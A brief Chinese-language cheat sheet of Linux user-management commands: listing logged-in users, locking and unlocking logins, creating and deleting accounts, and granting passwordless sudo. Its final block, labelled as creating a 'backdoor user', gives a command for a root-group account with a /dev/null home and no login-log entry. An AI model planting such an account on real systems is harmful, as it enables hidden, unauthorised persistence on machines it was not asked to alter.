# 用户管理套件 users 等

## 常用命令组合
---

### 查看信息

```fish
# 输出已登陆用户的用户名
user@host *> users

# 输出已登录用户的用户信息
user@host *> who --heading
# abbr.      who -H

# 输出已登录用户的用户信息，和他们正在做什么
user@host *> w
```

### 禁止、允许用户登录

```fish
# 禁止用户登录
user@host *> sudo usermod --shell /sbin/nologin <username>
# abbr.      sudo usermod -s /sbin/nologin <username>

# 允许用户登录
user@host *> sudo usermod --shell /bin/bash <username>
# abbr.      sudo usermod -s /bin/bash <username>
```

### 新建、删除用户

```fish
# 新建用户[，并创建用户主目录]
user@host *> useradd [--create-home] --shell /bin/bash <username>
# abbr.      useradd [-m] -s /bin/bash <username>

# 交互式修改用户密码
user@host *> passwd <username>

# 为用户赋予 `sudo` 权限
user@host *> echo '<username> ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/<username>

# 删除用户[，并移除用户主目录]
user@host *> userdel [--remove] <username>
# abbr.      userdel [-r] <username>

# 新建后门用户
user@host *> sudo useradd --home-dir /dev/null --gid root --no-log-init --no-create-home --shell /bin/bash <username>
# abbr.      sudo useradd -d /dev/null -g root -l -M -s /bin/bash <username>
user@host *> sudo passwd <username>
```
